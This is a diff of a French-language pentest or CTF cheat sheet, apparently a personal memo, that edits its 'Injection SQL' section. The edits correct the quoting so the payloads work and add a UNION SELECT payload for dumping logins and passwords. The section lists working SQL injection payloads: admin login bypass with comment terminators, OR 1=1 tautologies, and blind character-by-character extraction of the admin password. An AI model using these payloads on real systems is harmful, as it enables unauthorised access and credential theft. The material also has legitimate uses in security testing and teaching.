@@ -14,13 +14,14 @@ Permet d’obtenir un serveur disposant d’une URL accessible sur internet et a
 
 # Injection SQL
 
-- admin’;# *(pour essayer de se connecter avec le compte Admin sans renseigner de mots de passe)*
-- admin’;–
+- admin';# *(pour essayer de se connecter avec le compte Admin sans renseigner de mots de passe)*
+- admin';--
 - admin";#
-- admin’;–
+- admin';--
 - ’ OR 1=1;#
-- ’ OR 1=1;–
+- ’ OR 1=1;/*
 - toto’ OR (SELECT SUBSTRING(password, 1, 1) FROM users WHERE login=‘admin’) = ‘a’;# *(puis tester, b, puis c, etc et si le résultat retourne quelque chose, c’est qu’on a trouvé la 1ère lettre, on peut alors passer à la lettre suivante et recommancer.*
+- toto' UNION SELECT login, password FROM users;/* *(s'assurer que la requête initiale remonte 2 colonnes, sinon ajuster le payload selon le nombre de colonnes à remonter via le UNION)*
 
 # Null Byte (fin de chaîne de caractère)
 
